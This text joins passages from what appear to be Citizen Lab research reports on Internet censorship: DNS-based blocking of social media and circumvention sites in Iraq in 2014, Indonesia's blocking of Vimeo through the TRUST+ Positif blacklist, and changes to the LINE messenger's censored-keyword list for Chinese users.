SOURCE\nRenesys reported that these networks were restored several hours later:\nFigure 4: Renesys BGP and Traceroute data showing June 20th outage.  SOURCE\nISIS actively uses social media to spread its messaging. For example, the group introduced an Android app in April 2014, called The Dawn of Glad Tidings, which leverages Twitter users’ accounts to share ISIS-related tweets. The application was  removed from the Google Play store for violating community guidelines.\nFigure 5: ISIS Android app Dawn of Glad Tidings. SOURCE\nThe group also uses well coordinated hashtag campaigns to spread their message, and had their Twitter account shut down after a number of graphic photos of victims attacked by ISIS were shared.\nComplete shutdown of the Internet during political crises have been seen in numerous other countries in recent years, including Egypt and Libya during the  2011 Arab Spring  and in Syria during the ongoing conflict in the country. We have documented the ways in which sensitive political events, ranging from violent conflict to elections and the hosting of international events, lead to changes in the application of information controls.\nMethodology\nWe used two methods to determine if and how filtering is being applied in Iraq. The first method performs remote lookups of DNS records to identify suspicious results which could be indicative of filtering. The second method undertakes remote testing of website accessibility through proxies. We wrote a script that performs a GET request of a list of websites through six different publicly accessible proxies located in Iraq. We then compare the results of these GET requests with attempts to access the same URLs from the University of Toronto network to identify instances of blocking.\nEarly reports from Iraq suggested that blocking was performed on some ISPs through DNS tampering. DNS converts domain names (such as “citizenlab.org”) to an IP address (74.208.36.253). If the information in DNS records is tampered with, domain names can resolve to an incorrect IP address, which can lead visitors to a blockpage. In some cases, it is possible to perform lookups of the DNS records used by Iraq-based ISPs remotely, without being connected to that ISP directly. After performing these DNS lookups, we are able to compare the results for a given domain name with what we would expect to see to identify aberrations.\nWe performed a lookup of a list we compiled of 1,358 URLs to identify suspicious DNS results. We also did GET requests for the URLs on this list on the publicly accessible proxies we found in Iraq. This list contains content ranging from international news sites, social media platforms, and content specific to Iraq’s domestic political, social and cultural context. A full list of URLs tested can be found in the Data section.\nResults\nFrom June 16-20, 2014, we tested a list of 1,358 URLs remotely through eight name servers that correspond to the following ISPs:\n\n\n\nISP\nHostname\nIP address\nSuspicious result?\n\n\nIQ Net\nnserver3.iqnet.com\n62.201.201.201\nYes\n\n\nIQ Net\nnserver4.iqnet.com\n62.201.201.202\nYes\n\n\nEarthlink Telecommunications\nn/a\n37.239.34.206\nYes\n\n\nEarthlink Telecommunications\nn/a\n37.236.154.55\nYes\n\n\nScopeSky\nns1.itc.iq\n185.23.153.242\nYes\n\n\nScopeSky\nns2.itc.iq\n185.23.153.243\nYes\n\n\nNewroz Telecom\nns1.newroztelecom.com\n93.91.200.200\nNo\n\n\nNewroz Telecom\nns2.newroztelecom.com\n93.91.200.201\nNo\n\n\n\nEarthlink Telecommunications\nRemote tests of these nameservers showed a number of URLs resolved to the IP address 192.168.222.66, which is a private, non-routable IP address. See this example for a DNS lookup of psiphon.ca:\n\n; <<>> DiG 9.7.0-P1 <<>> psiphon.ca;; Got answer:\n;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 38318\n;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 1\n;; QUESTION SECTION:\n;psiphon.ca.INA\n;; ANSWER SECTION:\npsiphon.ca.300INA192.168.222.66\n\nFrom our testing list, the following domains resolve to this IP address:\nec2-174-129-26-64.compute-1.amazonaws.com\nhidemyass.com\ninstagram.com\nwww.softlayer.com\nopenvpn.net\nplus.google.com\npsiphon.ca\ntwitter.com\nultrasurf.us\nwww.dmoz.org\nwww.facebook.com\nwww.hotspotshield.com\nwww.skype.com\nwww.strongvpn.com\nwww.tango.me\nwww.viber.com\nwww.whatsapp.com\nwww.xroxy.com\nwww.youtube.com\nThis result is unexpected. It is abnormal for a domain name to resolve to an IP address that is not publicly routable.\nWe tested the same list of sites through six Earthlink proxies from June 16 to 20, 2014.  When accessing some sites we are redirected to the same IP address (192.168.222.66) and presented with the blockpage pictured in Figure 6.\nAlthough there was some variability between sites found blocked on the six proxies, the following list of domains were found blocked at least once on one of the proxies, over the four day period.\nhidemyass.com\ninstagram.com\nopenvpn.net\ntwitter.com\nultrasurf.us\nwww.dmoz.org\nwww.facebook.com\nwww.hotspotshield.com\nwww.skype.com\nwww.softlayer.com\nwww.strongvpn.com\nwww.tango.me\nwww.viber.com\nwww.wechat.com\nwww.whatsapp.com\nwww.xroxy.com\nwww.youtube.com\nwww.gayhealth.com\nIn addition, when accessing this IP address (192.168.222.66) directly in a web browser, we also see the blockpage pictured in Figure 6.\nFigure 6: Blockpage seen using proxy on Earthlink Telecommunications\nOne interesting result is the block of the URL: ec2-174-129-26-64.compute-1.amazonaws.com.  This domain naming scheme is consistent with servers hosted on the Amazon EC2 hosting service (a large and popular cloud hosting provider based in the United States).  During subsequent testing we find that any domain in the *.compute-*.amazonaws.com domain namespace is blocked on this ISP.  For example, this URL http://ec2-174-129-212-31.compute-1.amazonaws.com which is hosting no content other than the default placeholder content of a webserver is blocked on Earthlink:\n \nFigure 7: A side-by-side comparison of accessing the same Amazon EC2 URL in Canada and Iraq.\nGiven that the content of this URL is benign it is likely not being targeted for blocking. This block is more likely to be the result of an overzealous filtering pattern used in the configuration of the domain name server.\nThis block also results in the collateral filtering of any URL that both hosts their website on the Amazon EC2 service and configures their DNS to use the compute-*.amazonaws.com domain, such as through a common name (CNAME) record.  Examples of sites that are filtered as result of this configuration include:\nhttp://www.virtuefitness.com/ – Fitness site\nhttp://www.gayhealth.com/ – Defunct gay health information site\nhttp://www.exoplatform.com/ – Social platform for companies\nScopeSky\nFrom our testing list, five domains resolved to the IP address 185.23.153.235, as shown in this example of a lookup of twitter.com:\n\n;; QUESTION SECTION:\r\n;twitter.com.INA\r\n\r\n;; ANSWER SECTION:\r\ntwitter.com. 86400INA1 85.23.153.235\r\n\r\n;; AUTHORITY SECTION:\r\ntwitter.com. 86400INNS ns1.itc.iq.\r\n\n\n185.23.153.235  is an IP address hosted on the ISP ITC in Iraq:\n60929   | 185.23.153.235   | ITC Investment and technology group of companies limited,IQ\nWhen visiting this IP address in a web browser, we are presented with the following blockpage:\nFigure 8: Blockpage seen on ScopeSky Communications\nOn this ISP the following domains were found to resolve to this IP address and are blocked:\ntwitter.com\nwww.facebook.com\nwww.viber.com\nwww.whatsapp.com\nwww.youtube.com\nIQ Net\nDuring the course of testing our list through IQ Net, the nameserver gave responses that delegated the nameserver itself (nserver3.iqnet.com) as authoritative for a number of domains by altering the start of authority (SOA) record. See an example of this in a response for a DNS lookup for www.viber.com:\n$ dig +short @62.201.201.201 viber.com SOA\nnserver3.iqnet.com. firas.iqnet.com. 2014061301 10800 900 604800 86400\nCompare this result to one using a public DNS resolver instead:\n$ dig +short @8.8.8.8 viber.com SOA\na1.verisigndns.com. dnssupport.verisign-grs.com. 1384964559 28800 7200 1209600 300\nWhile this result is not itself evidence of deliberate filtering (for example, we may see such a result if a company such as Google were to host servers on the ISP), the list of domains with altered SOA is suspicious and is likely indicative of blocking. The following list of domains returned an altered SOA record when resolving through IQ Net name servers:\ngoogle.com\nviber.com\nwhatsapp.com\nyoutube.com\nNewroz Telecom\nThere were no suspicious results found in tests of the nameservers of this ISP. This result  was expected, because this ISP serves the Kurdistan area, and reports have indicated that the shutdown and social media blocking orders did not include Kurdistan.\nSummary of results\nThe websites our tests found to be blocked represent a small number of content categories, and generally correspond with the list of sites ordered to be filtered by the Iraqi Ministry of Communications. We also tested the accessibility of 7 URLs of sites which are affiliated with or supportive of ISIS. We did not find any evidence, through both DNS lookups and proxy testing, that any of these URLs are blocked.  Given that the insurgency was cited as the rationale for the shutdown and filtering, this finding is curious.\nThe following table summarizes the domains we found blocked in Iraq:\n\n\n\nDomain\nDescription\n\n\nec2-174-129-26-64.compute-1.amazonaws.com\nHosting Provider\n\n\nhidemyass.com\nCircumvention/Anonymization\n\n\ninstagram.com\nSocial media\n\n\nwww.softlayer.com\nHosting Provider\n\n\nopenvpn.net\nCircumvention/Anonymization\n\n\nplus.google.com\nSocial media\n\n\npsiphon.ca\nCircumvention/Anonymization\n\n\ntwitter.com\nSocial media\n\n\nultrasurf.us\nCircumvention/Anonymization\n\n\nwww.dmoz.org\nWeb Portal\n\n\nwww.facebook.com\nSocial media\n\n\nwww.hotspotshield.com\nCircumvention/Anonymization\n\n\nwww.skype.com\nVoice-over-IP\n\n\nwww.strongvpn.com\nCircumvention/Anonymization\n\n\nwww.tango.me\nMobile Messaging App\n\n\nwww.viber.com\nMobile Messaging App\n\n\nwww.whatsapp.com\nMobile Messaging App\n\n\nwww.xroxy.com\nCircumvention/Anonymization\n\n\nwww.youtube.com\nVideo Sharing\n\n\nwww.wechat.com\nMobile Messaging App\n\n\n\nCircumvention usage in Iraq\nIn many cases Internet filtering implemented by DNS tampering is straightforward to circumvent. Users can simply select an alternate DNS service that will perform name resolution correctly. However this circumvention method can also be manipulated by censors, as seen recently in Turkey where providers intercepted requests to Google’s public DNS servers in order to prevent censorship circumvention. We have received anecdotal reports from users located in Iraq that using Google’s public DNS servers did not circumvent censorship, suggesting that DNS requests are being hijacked. However, circumvention services have reported increased usage from users based in Iraq.\nThe circumvention service Psiphon reports a significant increase in users connecting from Iraq starting from June 13 after social media platforms were blocked, as seen in Figure 9. Note that 97% of these users are connected to Psiphon through their mobile phone using the Psiphon Android application.\nFigure 9: Daily users of circumvention tool Psiphon in Iraq in June 2014.\n \nSimilarly, usage of Tor, a popular anonymization tool which can circumvent censorship, has also increased significantly in June:\nFigure 10: Directly connecting users of Tor in Iraq in June 2014.  SOURCE\nConclusion\nGiven the volatile situation in the country, it is uncertain how Internet accessibility will be further affected. The Citizen Lab will continue to monitor the situation and post updates to our findings.\nData\nA full list of data from these tests can be found at our GitHub repository.\nAcknowledgements\nJakub Dalek, Adam Senft, Helmi Noman, and Masashi Crete-Nishihata undertook research and writing of this report, supported by the Social Sciences and Humanities Research Council (Canada) Grant 430-2014-00183, Prof. Ronald J.

    "text": "\n\t\t\t\tDownload PDF version I Read on ISSUU\nBaca laporan ini dalam Bahasa Indonesia: “Pemblokiran Vimeo di Indonesia.”\n“Op-ed: Toward an open, free and secure Internet,” written by Irene Poetranto and published in The Jakarta Post, on May 24, 2014.\nIntroduction\nThe Citizen Lab has been conducting research on Internet censorship and surveillance in Indonesia since 2010. Indonesia is a country of interest because there is an absence of standardized laws and regulations that systematically regulate content-control practices and a lack of transparency and independent oversight over the government-mandated censorship regime, which means an increased risk for infringing on fundamental rights. Indeed, the country’s Ministry of Communications and Information (MICT) has been criticized for the opaque nature of its censorship regime in general, and the recent wholesale ban of video-sharing site Vimeo in particular. The practice of wholesale blocking of websites like Vimeo, a video sharing site which is known for its high-quality and high-definition videos, could do more harm than good to the economy in the long run as the country’s e-commerce market is growing rapidly and an increasing number of businesses are promoting themselves online. In order for the Internet to continue to be a key enabler of economic growth,  the information controls framework must be consistent, greatly simplified, and harmonized to make it less burdensome and more transparent for business.\nAs part of our work of monitoring developments in the country’s Internet governance agenda, this report seeks to outline information controls and explain the recent blocking of Vimeo in Indonesia.\nInformation Controls in Indonesia\nInformation controls refer to efforts to manage the content accessible to a population, including information posted online. These controls can include laws and regulations that restrict free speech online or in certain media, as well as technical measures designed to limit access to information such as Internet filtering. We employ a mixed-methods approach to the study of information controls that includes technical testing of government-mandated Internet censorship policies and practices, field research by regional and country-level experts, as well as analyzing the legal and regulatory framework governing filtering. This multidisciplinary effort is essential for understanding both how and why information controls are applied. We also investigate the specific techniques and, where possible, the products that are used to implement Internet content filtering. Using a mixed methods approach in our research on Indonesia  has yielded important insight into the scope, scale, and character of content controls.\nLegal and Regulatory Framework\nDespite the guarantees freedom of expression under article 28E(3) of the Indonesian constitution, a number of laws exist which limit freedom of expression online and restrict access to content considered dangerous or socially unacceptable. The penal code and the 1965 blasphemy law which prohibits religious blasphemy are used to limit free expression. But the most prominent laws are the 2008 Electronic Information and Transaction (EIT) Law and the 2008 Anti-Pornography Law. Our blog post on Indonesian Internet infrastructure and governance as part of the “Islands of Control, Islands of Resistance: Monitoring the 2013 Indonesia IGF” report explains the nature of these laws in greater detail. Apart from specific invocations of the law, the Indonesian government also pressures ISPs to block websites with objectionable content.\nImplementation of Information Controls\nThe Internet environment in Indonesia is broadly distributed across over 300 ISPs. As a result, the scope and depth of what content is actually filtered can vary between ISPs, leaving users with different Internet experiences depending on where they connect from. Recently, there is a growing push towards standardization, if not centralization. For example, a number of national-level systems have emerged which are promoted by the MCIT that offer filtering services. ISPs are encouraged to connect to these services as a way to subcontract out the job of Internet filtering and to ensure that ISPs comply with government “rules” and expectations. Additionally, ISPs have begun to purchase commercial filtering products, for example, those made by Western companies like Netsweeper Inc. and Blue Coat Systems, whose services include categorizing and controlling access to content online, thus taking the burden of maintaining content controls away from ISP administrators.\nTo assist in their implementation, the MCIT is currently drafting a Ministerial Decree on the Controlling of Internet Websites with Negative Content. As these developments are ongoing, the existing decentralized nature of information controls in Indonesia could in practice become more standardized.  Our blog post on analyzing content controls in Indonesia as part of the “Islands of Control, Islands of Resistance: Monitoring the 2013 Indonesia IGF” report discusses the the country’s filtering policies and practices in greater detail.\nTechnical Analysis of Information Controls\nThe MCIT endorses two DNS filtering projects that include configurations and URL lists to standardize content filtering, TRUST+ Positif and DNS Nawala. Currently, the implementation of these programs is optional and Indonesian ISPs use a number of other filtering systems and techniques. As a result, there are inconsistencies regarding what content is blocked.\nDNS Filtering\nThe Indonesian private sector has tried to standardize the criteria for content to be filtered and the techniques for DNS filtering since 2008, when the Association of Indonesia’s Internet Cafés (AWARI) started an initiative to implement uniform filtering across Internet cafés and provide a means for users to report sites for blocking. Prior to 2008, filtering in Internet cafés was decentralized.\nThese moves toward standardization were further enhanced with the development of DNS Nawala, an initiative that the MCIT started in November 2009 with the support of AWARI, PT Telkom, and Indonesian political parties in a response to pressures to implement the 2008 Anti-Pornography Law and the introduction of the “Healthy and Safe Internet” (INSAN) program.\nTRUST+ Positif\nTRUST+ Positif is another attempt to standardize content filtering which is maintained and endorsed by the MCIT. The system consists of a database of both blacklisted and whitelisted domains, URLs and keywords, as well as configuration information to allow administrators to implement filtering using the open-source Squid-Cache HTTP proxy/caching system and the SquidGuard add-on, which is an open source implementation of URL access control lists for Squid. The content of these lists and information about the restricted content are publicly accessible.\nThe TRUST+ Positif website includes a submission page that encourages users to participate in the development of URL lists (to blacklist websites for filtering or whitelist for accessibility) by forwarding pages to an e-mail address or filling in a submission form (at the time of publication, this form is described as “currently under development”). The site also contains a search form which allows searching for the presence of keywords, URLs or domains in the content database. However, how this submission process operates in practice is unclear and the MCIT ultimately decides what to block.\nThe blacklist database is split into 3 sub-categories:  “study results” (kajian), “public submissions” (pengaduan) and “international pornography”. The ‘study results’ database contains 1366 domains, the ‘public submissions’ database contains 12,643 domains and the ‘international pornography’ database contains 745,030 domains. As of May 25, 2014 there are no URLs in any of the three sub-category databases.\nSearching the available search form for ‘vimeo’ shows a match with the domains list on the ‘public submissions’ (pengaduan) database:\n\nFigure 1: Search results showing Vimeo is present in TRUST+ Positif public database\nFurther investigation shows that ‘vimeo.com’ is present in this database, which as of writing is timestamped May 21, 2014.\nIt is unclear how domains or URLs submitted for review are vetted before being added to the submissions blacklist. It is also unclear how ISPs differ in their use of these blacklist databases, from blocking all of these sub-categories or being more selective. In addition, these databases are not free from errors and miscategorizations. Our previous research examined such miscategorizations in the TRUST+ Positif database, finding numerous examples of sites incorrectly categorized as pornography. From that small sample we found that the websites of the government of Gibraltar and the University of Rochester library, amongst others, were incorrectly labeled as pornography. As of May 26 2014 these domains remain on the pornography blacklist.\nThe Blocking of Vimeo\nIn May 2014, Indonesian netizens took to social media to express their frustrations over the blocking of Vimeo, a video sharing site. Telkomsel’s customersfirstnoticed the block, but soon two other major ISPs (Indosat and XL Axiata) reported on it, though the site remained accessible to customers of smaller ISPs. Indra Utoyo, Director of IT Solutions & Strategic Portfolio of PT Telkom (Telkomsel’s operator) said on Twitter that the directive to block Vimeo was based on the instructions of TRUST+ Positif team, mailed to Indonesian ISPs on Friday, May 9, 2014, along with dozens of sexually-oriented websites that were to be blocked. However, the chairman of the Indonesian ISP Association, Semmy Pangerapan, said that the organization never received the instruction letter and that not every ISP has received it by Sunday, May 10, 2014. Adding to the confusion, the MICT through its official Twitter account denied that it had ordered to block Vimeo and attached a screenshot of the website, but the statement has since been deleted.\nA number of users voiced their concerns by sending tweets directly to the Minister of Communications and Information, Tifatul Sembiring, asking for an explanation. Mr. Sembiring explained that the blocking occurred due to  pornographic content on Vimeo and and therefore a notice to all ISPs and telecommunications providers was sent out, informing them that Vimeo has been included in the ministry’s list of blacklisted URLs. He also mentioned that the ministry has sent a letter to Vimeo, asking them to remove the offending content. Several days later, Vimeo said through its official Twitter account that they have received the letter and, as of May 19, was looking into the request. The acting ministry spokesman Ismail Cawidu has since said that the ban is “not permanent.”\nMr. Sembiring argued that the action taken by the ministry is in accordance with stipulations in Law No. 44 of 2008 on Pornography. “Pornographic content” is often used as justification for the government’s decision to block specific URLs or websites, and most of these decisions are not publicly disputed. However, blocking Vimeo is controversial because not only has the website gained a reputation for its high-quality and high-definition videos, but the site also forbids users from uploading sexually explicit material or pornography. These developments are consistent with the pattern of blocking and filtering that we have seen previously in Indonesia.\nIn 2012, we found evidence of Internet filtering on Indosat, Telkomsel, and XL Axiata. All three ISPs filtered pornographic content and displayed block pages with varying degrees of transparency as to the reason behind the filtering. However the filtering was highly inconsistent in other respects, with Indosat and XL Axiata blocking far more content than Telkomsel did. For example, content relating to circumvention tools and free speech issues were blocked by Indosat and XL Axiata, while Telkomsel only showed evidence of blocking pornographic content.\nPart of our research on the 2013 IGF includes a report on content control in Indonesia. This research compared content accessibility within the IGF venue to that elsewhere in the country. We found that the primary wireless network provided for the IGF event, which is mandated by the UN host agreement to offer unfettered access, showed no evidence of blocking. However, alternate networks that were provided within the venue by Telkomsel and Indosat, as well as a 3G network provided by Tri Indonesia tested from elsewhere in Bali, had evidence of filtering.\nTesting Results\nFollowing reports of Vimeo’s blocking, we conducted client-based network measurement tests from within Indonesia. Data was collected by performing synchronized HTTP requests from within Indonesia and from a lab location (at the University of Toronto) using customized measurement software written in Python in a client-server model. The lab network acts as a control and is located at a site that does not censor the type of content tested by the measurement software.\nDuring tests the client attempts to access a pre-defined list of URLs simultaneously in the Indonesia (the “field”)  and in a control network (the “lab”). Tests were conducted on URL lists that consisted of locally sensitive URLs that are specific to Indonesia’s social, political, and cultural context, including content from Vimeo.\nA number of data points are collected for each URL access attempt: HTTP headers and status code, IP address, page body, traceroutes and packet captures. A combined process of automated and manual analysis attempts to identify differences in the results returned between the field and the lab to isolate instances of filtering. Because attempts to access websites from different geographic locations can return different data points for innocuous reasons (such as a domain resolving to different IP addresses for load balancing, or displaying content in different languages depending on where a request originates from) a manual inspection of results is often necessary to verify whether inaccessibility is caused by deliberate filtering or mundane network errors\nTests were conducted on the ISP Telkom Indonesia from May 13 to May 20, 2014. A total of 191 unique URLs were tested during this period, with each URL tested 10 times. A total of 86 of the 191 URLs were found to be blocked during at least one test. Attempts to access these 86 URLs saw the DNS lookup resolve to an incorrect IP (118.98.97.100) which redirected towards http://internet-positif.org/site.block?d=STRING, where STRING is a base64 encoding of the blocked domain. The IP (118.98.97.100) is hosted by Telkom Indonesia and hosts the Internet Positif blockpage:\n\nFigure 2: The TRUST+ Positifblockpage found at 118.98.97.100\nFrom this sample of 86 URLs found blocked, the most commonly blocked content categories were pornography, gambling and proxy/circumvention tools. Links to the  full list of URLs found blocked can be found in the Data section below.\nDuring the 10 tests run between May 13 and 20, there were 2 tests in which no blocking was documented. During these tests, DNS resolution occurred normally and all content tested was accessible. It is not clear if this intermittent accessibility of otherwise blocked content was the result of a misconfiguration of the censorship infrastructure or an issue with the testing setup. The earliest and most recent tests both showed evidence of filtering, so these two tests appear to be anomalies.\nWe tested a sample of 12 Vimeo URLs, including specific channels and groups identified by an MICT press release as containing pornographic content.  All 12 Vimeo URLs tested were found to be blocked during at least one test, although this was also intermittent, with some Vimeo URLs blocked on some tests but not others. The only exception we found was the HTTPS version of Vimeo (https://vimeo.com) — although it did incorrectly resolve to the IP 118.98.97.100 (like other blocked content), tests of this URL were never redirected to the TRUST+ Positif website. Instead, the initial HTTPS connection was rejected. This may be the case with all HTTPS versions of blocked URLs, however we do not have sufficient data to confirm this.\nSummary and Looking Ahead\nUnderstanding information controls without considering the broader social, political, and legal context and the ICT environment within which they are embedded is essentially impossible. This difficulty is due to the nature and character of information controls largely depend on a variety of factors: the market structure of ISPs and telecommunication companies; the informal relations and practices among stakeholders, especially a diverse and politically active civil society; and the legal and policy structures which frame them all. The blocking of Vimeo is but one example illustrating the challenges in Indonesia’s existing information control regime.\nThe most prominent laws used to justify content controls in Indonesia are the 2008 Electronic Information and Transaction (EIT) law and the 2008 Anti-Pornography law. These laws, however, have been controversial. Article 27(2) of the EIT law, which covers defamation, is of particular concern. Gatot S. Dewa Broto, the spokesperson for the MCIT, has acknowledged that many have judged the penalty of up to six years’ imprisonment and fines of up to IDR 1 billion (approximately USD 106,000) as being too harsh, especially because it is more severe than the provisions contained in the Penal Code, which specifies a penalty of up to nine months’ imprisonment. Despite calls to revise the EIT Law, the MCIT has yet to produce a revised draft to submit to parliament.\nThe Anti-Pornography Law has been criticized because the definition of pornography under the law is considered to be too broad and has been opposed by minority groups who argue it runs counter to Indonesia’s tradition of diversity and pluralism. Enforcing content controls using the EIT law and Anti-Pornography law is also problematic because to this day the government has yet to issue a Government Regulation (Peraturan Pemerintah) to operationalize the laws. Our previous blog post on content control in Indonesia elaborates on how these laws, in conjunction with other laws, such as those which prohibit blasphemy or “defamation of religions,” are used for content regulation.\nThe MCIT’s latest effort in standardizing content regulation is the drafting of a Ministerial Decree on the Controlling of Internet Websites with Negative Content. However this draft has also been criticized for its vague and overly broad provisions which allow authorities to criminalize free expression. The absence of laws and regulations that systematically regulate and narrowly define content-control practices mean that the authorities are at liberty to enforce them through their own interpretations of legislations and that ISPs may implement their own filtering devices and practices.\nThe sheer number of Indonesian ISPs and the decentralized nature of Indonesian Internet infrastructure also make uniform content control practices challenging. With regard to the recent blocking of Vimeo, for example, the MICT-issued directive to block the website did not reach all ISPs at the same time, and neither did it reach the Indonesian ISP Association (Asosiasi Penyedia Jasa Internet (APJII)). As a result, there was confusion as to why the website was accessible on some ISPs, but not others. This incident led to APJII’s chairman, Semmy Pangerapan, calling out the Minister of ICT as “arrogant” for the ministry’s unilateral decision to block Vimeo in a wholesale manner, as opposed to blocking specific accounts or URLs with objectionable content, without consulting other stakeholders. Due to this controversial decision, Mr. Pangerapan suggested that a content advisory board, which consists of government, civil society, and private sector, should be established, to avoid the consequences of having a concentration of power within one institution.\nTRUST+ Positif’s reliance on lists of blacklisted URLs is also problematic. Our research into the list of URLs labelled as “porn” — it is publicly available on TRUST+ Positif’s website — has found that there are numerous URL miscategorizations that result in erroneous blocking. Our 2013  content control in Indonesia study found that the UK government’s website on Gibraltar, as well as the University of Rochester’s library’s website are on the TRUST+ Positif blacklist and are thus blocked. These examples illustrate a key issue with blacklist-based filtering methods – the difficulty in accurately identifying and targeting content for blocking without errantly blocking unrelated content. Many blacklists are generated through a combination of manually and automated searches, and thus, they often contain websites that have been incorrectly classified. In addition, blunt filtering methods such as IP blocking can knock out large swaths of unrelated websites simply because they are hosted on the same IP address as a site with restricted content.\nThe Internet expands access to information beyond traditional media. This feature is perceived by many as important in Indonesia, where there is the concentration of media ownership in the hands of a small number of individuals. Twelve large conglomerates control nearly all of the country’s media channels, including broadcast, print, and online media, and therefore there are concerns that this “conglomeration” may affect the media’s independence.\nDuring the leadup to the July 2014 general elections, the Internet has provided a platform for social mobilization and civic action. Jakarta is said to be the most active Twitter city in the world and Indonesia has the fourth largest number of Facebook users. Indonesian netizens use these social networking sites to communicate directly with political parties’ candidates and discuss them amongst each other, while Indonesian political parties have been quick to adopt these communications platforms to market their candidates and policies.\nThe public uproar that ensued following the blocking of Vimeo has shown that Indonesian netizens are increasingly more aware not only of the value of the Internet as a tool to promote growth and development, but also their right to access, receive and impart information and ideas. The MICT has since backpedalled by saying that the ban is “not permanent,” and that it is merely “waiting to see a minimum effort to remove the pornographic content.” Considering Vimeo’s response that it “will not change its policies or censor any content in response to Indonesia’s decision to ban,” it is not yet clear how this situation will be resolved. This incident has shown that more than just a source of information, the Internet also plays an important role in facilitating citizen participation and engagement, and therefore must be kept open and accessible.\n\nData\nA full list of URLs tested and those identified as blocked can be found here.\n\n\t\t\t\t\n\t\t\t",

    "text": "\n\t\t\t\tDownload PDF version I Read on ISSUU\nThis report is the third in a series which analyzes regionally-based keyword censorship in LINE, a mobile messaging application developed by LINE Corporation (a subsidiary of South Korean Naver Corporation) based in Japan. We document recent changes to the list of keywords used by LINE to trigger regionally-based keyword filtering for users with accounts registered to Chinese phone numbers.\nPrevious Keyword List Changes\nIn November 2013, we reported on results from reverse engineering LINE in which we reveal that when the application is registered to a Chinese phone number, censorship functionality is enabled.\nThe code analysis in our first report was performed on LINE v3.8.5 for Android and the keyword blocking behaviour was confirmed on an Android device running v3.9.3 downloaded directly from the Google Play store. We confirmed the presence of censorship functionality going back to v3.4.2, released on January 18 2013.\nThe LINE keyword lists were modified in v3.9.4 released on November 18 2013.  In our original analysis we found LINE has an internal keyword list built in to the APK. If the user’s registered phone number is set to a Chinese number the application will download an additional keyword list from Naver’s server and block transmission of any messages that contain any of those keywords. The downloaded keyword file is stored in the application’s cache directory as cbw.dat. If this list is unavailable, LINE will default to using an internal list of 50 keywords. In LINE v3.9.4 the internal list was removed from the application.\nThe content of the list includes keywords that relate to domestic Chinese politics, human rights, and sensitive political events–many of which are rather obscure and only mentioned in media known for being critical of the Communist Party of China (CPC). A number of these keywords relate to lightly reported incidents that did not go viral, which raises questions as to why they were included. The fact that some of these censored incidents are not high profile seems to indicate that they have been added by LINE as a pre-emptive, preventative measure or could potentially have been intended for testing and not production use. Thus, the internal list may have been removed because these keywords no longer merit inclusion.\nKeyword List v22 Analysis\nOn April 8 2014, the keyword list that the application retrieves from Naver servers was updated from v21 to v22. This change is current as of LINE v4.3.0 released on April 26 2014. As with the previous version, list v22 is Base64 encoded and encrypted using AES in cipher block chaining mode with PCKS#7 padding. Decryption is done through a static key stored in the binary that remains the same as the previous list version.\nWe translated each keyword from Chinese to English and assigned them content categories using a set of categories we developed to analyze keywords used to trigger both keyword filtering and surveillance in TOM-Skype and keyword filtering only in Sina UC.\nList v22 contains 535 keywords in total. Comparing list v21 and v22 reveals that 312 new keywords have been added and 147 keywords have been deleted. The keywords are almost entirely in Chinese script; only 7 of 535 keywords do not contain Chinese characters. Some are combinations of scripts, such as ‘天安门1989’ (‘Tiananmen 1989’), a reference to the 1989 Tiananmen Square massacre.\nAll of the 147 removed keywords relate to the Bo Xilai scandal, which involved a prominent Chinese politician being jailed for corruption while his wife was convicted of murder. In previous research on the microblogging platform Sina Weibo we found that the keyword ‘薄熙来’ (‘Bo Xilai’) was blocked and unblocked in patterns that appear to be correlated with authorities filtering his name when online conversations got too unpredictable to control and unblocking it when Bo fell out of favor with the CPC. For example, following the official expulsion of Bo Xilai from the CPC in September 2012, his name was unblocked on Sina Weibo, which possibly reflects authorities easing censorship requirements around the scandal to provide netizens a space to discuss and criticize the disgraced leader. The removal of 147 keywords from LINE related to Bo Xilai may also be the result of directives allowing discussion of Bo. However, 10 new keywords relating to Bo Xilai were added to list v22, and 2 of the Bo Xilai keywords from v21 were not removed. The 12 remaining Bo Xilai keywords on list v22 do not appear to be qualitatively different from the 147 deleted keywords and it is unclear why they are retained while the others are removed.\nThe majority of the 312 new additions to the keyword list relate to Chinese government officials or notable political events. These keywords include references to government officials (22.7% of the total new keywords), criticism of the CPC (8.9%), references to the June 4, 1989 Tiananmen Square massacre (7.6%), references to the relatives of political figures (8.3%) and references to political scandals (5.1%). References to Tiananmen Square previously accounted for 15% of the keywords on list v21, second only to the Bo Xilai scandal. After these 5 categories, the next most common categories of keywords added to list v22 were those relating to the CPC generally (4.8%) and content relating to dissidents/activists (4.1%).\nSee Figure 1 for a breakdown of the content categories of the new keywords added to list v22:\nFigure 1: Categories of new keywords added to LINE list v22.\nThe complete list v22 shows that keywords relating to Tiananmen Square (15%) make up the largest single category.\nSee Figure 2 for a breakdown of the all the categories in list v22.\nFigure 2: Categories of all keywords on LINE list v22.\nComparing LINE Keyword Lists to TOM-Skype and Sina UC\nOur dataset on TOM-Skype and Sina UC comprises 88 separate keyword lists, which combined contain 4,256 unique keywords. Comparison of TOM-Skype and Sina UC keyword lists revealed that of the 4,256 unique keywords, only 138 terms (3.2%) were shared in common between two clients.\nOf the 535 total keywords on LINE list v22, 45 are an identical match on TOM-Skype lists, 19 on Sina UC lists and 34 on the lists of both clients for a total of 98 (18%) keywords on list v22 matching the China Chats dataset.\nCompared to the 370 total keywords of LINE list v21, 8 are an identical match on TOM-Skype lists, 10 on Sina UC lists and 9 on lists of both clients for a total of 27 (0.7%) keywords on list v21 matching the China Chats dataset.\nThe top categories for keywords which appear on both the v22 list and either of the TOM-Skype/Sina UC lists are content relating to CPC members/government officials (22% of these 98 keywords), content relating to the Tiananmen Square massacre (12%), content relating to dissidents/activists (12%) and keywords related to the Falun Gong (10%).\nWe observe a similar lack of overlap between the LINE, TOM-Skype, and Sina UC lists. The inconsistencies between the lists used for the three clients suggests that no common keyword list is provided to companies operating chat programs in the Chinese market.\nConclusion\nIt is unclear how the content of LINE keyword lists are determined. LINE previously had a partnership with Chinese software company Qihoo 360 Technology Co., Ltd to distribute a Chinese branded version of the application called Lianwo (连我). This week LINE announced that it changed domestic Chinese partners from Qihoo 360 to Beijing Zhuoyi Xunchang Technology Co. Ltd also know as “wandojia” (豌豆莢). In the official announcement of this new partnership its noted that amongst its responsbilities Wandojia will provide technical support to LINE operations in China. How this new relationship affects the implementation and content of keyword filtering for Chinese users is uncertain. \nFollowing our first report we sent LINE Corporation a letter asking a number of questions including a request for clarification of the relationship 